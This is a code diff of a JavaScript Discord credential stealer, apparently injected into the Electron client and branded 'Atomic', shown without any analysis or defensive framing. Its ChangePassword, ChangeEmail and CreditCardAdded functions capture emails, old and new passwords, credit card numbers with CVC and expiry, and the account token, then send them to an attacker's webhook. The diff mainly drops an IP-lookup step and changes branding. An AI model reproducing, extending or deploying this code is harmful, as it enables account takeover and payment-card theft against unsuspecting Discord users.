@@ -126,7 +126,7 @@ function GetBadges(flags) {
         badges += "Discord Developer, "
     }
     if (badges == "") {
-        badges = "None"
+        badges = "No"
     }
     return badges
 }
@@ -192,6 +192,8 @@ function Login(email, password, token) {
         })
     }
 
+
+
 function ChangePassword(oldpassword, newpassword, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -200,60 +202,46 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
         const json = JSON.parse(info);
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
+            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "<:8485discordemployee:940583845063979008> | Password Changed :",
+                            "name": "<a:blbutterfly:932017632322916362> | Password Changed :",
                             "value": `Email: \`${json.email}\`\nOld Password: \`${oldpassword}\`\nNew Password: \`${newpassword}\``,
                             "inline": false
                         },
-
-
-                        {
-                            "name": ":unlock: | Token :",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        },
-
-
                         {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
                             "inline": true
                         },
-
-
                         {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
+                            "name": ":unlock: | Token :",
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    }
-                }]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
+                    },
+                    "footer": {
+                        "text": "Atomic On Top"
+                    }                 
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
     })
 }
 
-function ChangePassword(oldpassword, newpassword, token) {
+function ChangeEmail(newemail, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -261,45 +249,28 @@ function ChangePassword(oldpassword, newpassword, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
         var json = JSON.parse(info);
         var params = {
             username: "Atomic",
             content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
+            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": "<:8485discordemployee:940583845063979008> | Email Changed :",
+                            "name": "<a:blbutterfly:932017632322916362> | Email Changed :",
                             "value": `New Email: \`${newemail}\`\nPassword: \`${password}\``,
-                            "inline": false
+                            "inline": true
                         },
-                        
-                        
-                        {
-                            "name": ":unlock: | Token :",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        },
-                        
-                        
                         {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": false
+                            "inline": true
                         },
-
-
                         {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
+                            "name": ":unlock: | Token :",
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
@@ -308,16 +279,16 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "AtomicStealer"
-                    }
-                }]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
+                        "text": "Atomic On Top"
+                    }                
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
     })
 }
 
-function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -325,45 +296,28 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-        window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
         var json = JSON.parse(info);
         var params = {
             username: "Atomic",
-            content: "",
-            avatar_url: "https://media.discordapp.net/attachments/943791611027021824/943950716911890502/Atomic_Logo.jpg?width=480&height=480",
+            content: "@everyone",
+            avatar_url: "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg",
             embeds: [
                 {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": ":credit_card: | Credit Card Added",
+                            "name": "<a:card:932017676610580551> | Credit Card Added",
                             "value": `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
-                            "inline": false
+                            "inline": true
                         },
-
-
-                        {
-                            "name": ":unlock: | Token :",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        },
-
-                        
                         {
                             "name": "<a:discord_gif:709806861351911445> | Other :",
                             "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": false
+                            "inline": true
                         },
-
-
                         {
-                            "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}```,
+                            "name": ":unlock: | Token :",
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
@@ -372,12 +326,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "AtomicStealer"
+                        "text": "Atomic On Top"
                     }
-                }]
-            }
-            SendToWebhook(JSON.stringify(params))
-        })
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
     })
 }
 
